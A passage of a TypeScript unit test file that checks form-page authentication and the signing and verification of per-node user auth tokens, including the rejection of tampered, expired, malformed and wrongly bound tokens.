			const token = generateFormUserAuthToken(pageNode, authedUser, {
				workflowId: WORKFLOW_ID,
				executionId: EXECUTION_ID,
			});
			const { ctx, req } = buildContext('POST', pageAuthCookie({ workflowId: WORKFLOW_ID }));
			req.headers = { ...req.headers, 'x-auth-token': token };

			const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

			expect(result.authedUser).toEqual(authedUser);
		});
	});

	// The OAuth2 token's audience is the trigger's URL, which a page's own resource
	// URL is not, so a page can never satisfy that check — it must not try.
	it('does not attempt the OAuth2 flow', async () => {
		const { ctx, res } = buildContext('GET');

		const result = await validateFormPageAuth(ctx, 'n8nUserAuth');

		expect(ctx.beginN8nOAuth2Flow).not.toHaveBeenCalled();
		expect(ctx.validateN8nOAuth2Token).not.toHaveBeenCalled();
		expect(ctx.establishTriggerIdentity).not.toHaveBeenCalled();
		expect(result.responded).toBe(true);
		expect(res.writeHead).toHaveBeenCalledWith(
			302,
			expect.objectContaining({ Location: expect.stringContaining('/signin?redirect=') }),
		);
	});
});

describe('generateFormUserAuthToken / verifyFormUserAuthToken', () => {
	const node = { id: 'node-id', webhookId: 'webhook-id' } as INode;
	const user = {
		id: 'user-1',
		email: 'user@example.com',
		firstName: 'Test',
		lastName: 'User',
	};
	const binding = { workflowId: 'workflow-id' };

	it('round-trips a freshly generated token', () => {
		const token = generateFormUserAuthToken(node, user, binding);
		expect(verifyFormUserAuthToken(token, node)).toEqual(user);
	});

	it('rejects a token signed for a different node', () => {
		const token = generateFormUserAuthToken(node, user, binding);
		const otherNode = { id: 'node-2', webhookId: 'webhook-2' } as INode;
		expect(verifyFormUserAuthToken(token, otherNode)).toBeNull();
	});

	it('rejects a tampered signature', () => {
		const token = generateFormUserAuthToken(node, user, binding);
		const parts = token.split('.');
		parts[2] = parts[2].replace(/.$/, (c) => (c === 'A' ? 'B' : 'A'));
		const tampered = parts.join('.');
		expect(verifyFormUserAuthToken(tampered, node)).toBeNull();
	});

	it('rejects a tampered payload', () => {
		const token = generateFormUserAuthToken(node, user, binding);
		const parts = token.split('.');
		parts[1] = Buffer.from(
			JSON.stringify({
				sub: 'attacker',
				email: 'a@b',
				firstName: 'a',
				lastName: 'b',
				nid: node.id,
				wid: node.webhookId,
			}),
		).toString('base64url');
		const tampered = parts.join('.');
		expect(verifyFormUserAuthToken(tampered, node)).toBeNull();
	});

	it('rejects an expired token', () => {
		const realNow = Date.now();
		vi.useFakeTimers();
		try {
			vi.setSystemTime(realNow - 2 * 60 * 60 * 1000);
			const token = generateFormUserAuthToken(node, user, binding);
			vi.setSystemTime(realNow);
			expect(verifyFormUserAuthToken(token, node)).toBeNull();
		} finally {
			vi.useRealTimers();
		}
	});

	it('rejects malformed tokens', () => {
		expect(verifyFormUserAuthToken('garbage', node)).toBeNull();
		expect(verifyFormUserAuthToken('a.b', node)).toBeNull();
		expect(verifyFormUserAuthToken('a.b.c.d', node)).toBeNull();
	});

	it('accepts a token minted without an execution for any execution', () => {
		const token = generateFormUserAuthToken(node, user, binding);
		expect(verifyFormUserAuthToken(token, node, 'exec-1')).toEqual(user);
		expect(verifyFormUserAuthToken(token, node, undefined)).toEqual(user);
	});

	it('accepts a token bound to the execution being served', () => {
		const token = generateFormUserAuthToken(node, user, { ...binding, executionId: 'exec-1' });
		expect(verifyFormUserAuthToken(token, node, 'exec-1')).toEqual(user);
	});

	it('rejects a token bound to another execution', () => {
		const token = generateFormUserAuthToken(node, user, { ...binding, executionId: 'exec-1' });
		expect(verifyFormUserAuthToken(token, node, 'exec-2')).toBeNull();
		expect(verifyFormUserAuthToken(token, node, undefined)).toBeNull();
	});

	// Tokens minted by an older version carry neither binding claim and stay valid
	// for the node they name, so a rolling deploy doesn't invalidate open forms.
	it('accepts a token carrying neither binding claim', () => {
		const token = jwt.sign(
			{
				sub: user.id,
				email: user.email,
				firstName: user.firstName,
				lastName: user.lastName,
				nid: node.id,
				wid: node.webhookId,
			},
			'test-hmac-secret',
			{ algorithm: 'HS256', expiresIn: 60 },
		);
		expect(verifyFormUserAuthToken(token, node, 'exec-1')).toEqual(user);
	});
});
